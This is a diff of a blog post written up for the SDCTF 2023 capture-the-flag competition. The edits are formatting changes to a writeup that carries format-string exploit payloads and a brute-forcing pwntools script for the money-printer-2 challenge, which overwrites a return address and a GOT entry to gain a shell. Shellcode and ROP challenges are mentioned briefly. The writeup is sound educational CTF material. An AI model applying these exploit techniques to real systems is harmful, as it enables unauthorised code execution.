@@ -1,14 +1,12 @@
 ---
-title: "SDCTF 2023 Writeup"
-date: "2023-05-07"
+title: 'SDCTF 2023 Writeup'
+date: '2023-05-07'
 tags: ['Writeup', 'Pwn']
 draft: false
 summary: "The money-printer-2 challenge is a really interesting format string challenge. It shows a cool fmt exploit technique that leverages chained pointer and brute forcing which I haven't seen before."
 ---
 
 The money-printer-2 challenge is a really interesting format string challenge. It shows a cool fmt exploit technique that leverages chained pointer and brute forcing which I haven't seen before.
-
-
 
 ## Pwn
 
@@ -33,7 +31,7 @@ In most instances, the existing pointer does not lead to our intended address. A
 
 **chained fmt pointer + brute force**
 
-Assuming our target address is the return address of the main function, situated at `rbp+8`, we lack a direct pointer. Consequently, our initial task is to identify a stack pointer (`ptr1`) that points to another stack pointer (`ptr2`)  whose pointing address differs from our target address only in the last 2 bytes (or possibly 12 bits). Then we first leverage that stack pointer `ptr1` to overwrite the last 2 bytes of our stack pointer `ptr2`, making it has the possibility to point to the ret address. Finally, we use the second pointer `ptr2` to overwrite our target address.
+Assuming our target address is the return address of the main function, situated at `rbp+8`, we lack a direct pointer. Consequently, our initial task is to identify a stack pointer (`ptr1`) that points to another stack pointer (`ptr2`) whose pointing address differs from our target address only in the last 2 bytes (or possibly 12 bits). Then we first leverage that stack pointer `ptr1` to overwrite the last 2 bytes of our stack pointer `ptr2`, making it has the possibility to point to the ret address. Finally, we use the second pointer `ptr2` to overwrite our target address.
 
 ![money-printer-2](/static/images/SDCTF-2023-Writeup/money-printer-2.png)
 
@@ -42,7 +40,7 @@ The payload may appear as follows:
 ```
 offset = 0x2e98 # a randomly chosen offset
 # payload = f'%{offset}c%25$hn' # THIS WILL NOT WORK!!!
-payload = '%c'*23 + f'%{offset-23}c%hn' 
+payload = '%c'*23 + f'%{offset-23}c%hn'
 payload += f'%{main_addr-offset}c%51$lln'
 sh.sendline(payload.encode())
 ```
@@ -62,7 +60,7 @@ Solution:
         2/ use our particially overwrited pointer to overwrite the ret addr to the address of (gets+printf)
         2/ overwrite the printf@got to system@plt
 
-Some info:   
+Some info:
     printf payload should less than 0x64 bytes
     our input starts from argument $7
 
@@ -83,7 +81,7 @@ printf_got_addr = binary.got['printf'] # 0x601038
 main_addr = binary.symbols['main']
 
 def exploit(sh):
-    """ 
+    """
         chained fmt:
         1/ find a existing ptr on the stack that points to the another stack addr near the ret addr of main
         2/ leverging the existing ptr to overwrite the pointed stack addr to the ret addr of main (bruteforce)
@@ -95,13 +93,13 @@ def exploit(sh):
     integer_underflow(sh)
 
     offset = 0x2e98
-    payload = '%c'*23 + f'%{offset-23}c%hn' # watchout the %25$hn will not work!!! 
+    payload = '%c'*23 + f'%{offset-23}c%hn' # watchout the %25$hn will not work!!!
     # payload = f'%{offset}c%25$hn' # THIS WILL NOT WORK!!!
     payload += f'%{system_plt_addr-offset}c%19$lln'
     payload += f'%{main_addr-system_plt_addr}c%51$lln'
     payload += 'A'*(0x58-len(payload)) + p64(printf_got_addr).decode()
     sh.sendline(payload.encode())
-    
+
     log.info(sh.recvuntil(b'how many of them do you want?'))
     sh.sendline(b"-1001")
     sh.recvuntil(b'Is there anything you would like to say to the audience?')
@@ -116,7 +114,7 @@ def exploit(sh):
     log.info(sh.recv())
     log.info(sh.recv())
     sh.interactive()
-    
+
 
 
 def run_exploit(i):
@@ -134,13 +132,11 @@ if __name__ == "__main__":
     max_threads = 8
     with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
         results = [executor.submit(run_exploit, i) for i in range(5000)]
-        
+
         for future in concurrent.futures.as_completed(results):
             if future.result():
                 break
 ```
-
-
 
 ### turtle-shell
 
@@ -156,8 +152,6 @@ sh.sendline(shellcode)
 
 ![turtle-1](/static/images/SDCTF-2023-Writeup/turtle-1.png)
 
-
-
 ### tROPic-thunder
 
 The binary provided by this challenge has a stack overflow vulnerability, however, the binary is protected by the `seccomp` sandbox.
@@ -170,7 +164,7 @@ void setup_seccomp(void)
   uint uVar2;
   uint uVar3;
   undefined8 uVar4;
-  
+
   uVar4 = seccomp_init(0x7fff0000);
   uVar1 = seccomp_rule_add(uVar4,0,0x3b,0);
   uVar2 = seccomp_rule_add(uVar4,0,0x142,0);
@@ -266,4 +260,3 @@ def exploit(i):
 The binary firstly has an integer underflow which will lead to an fmt vulnerability. Since the binary also read the flag to the stack, we can leverage the fmt to print that content out.
 
 ![print-money-1](/static/images/SDCTF-2023-Writeup/print-money-1.png)
-
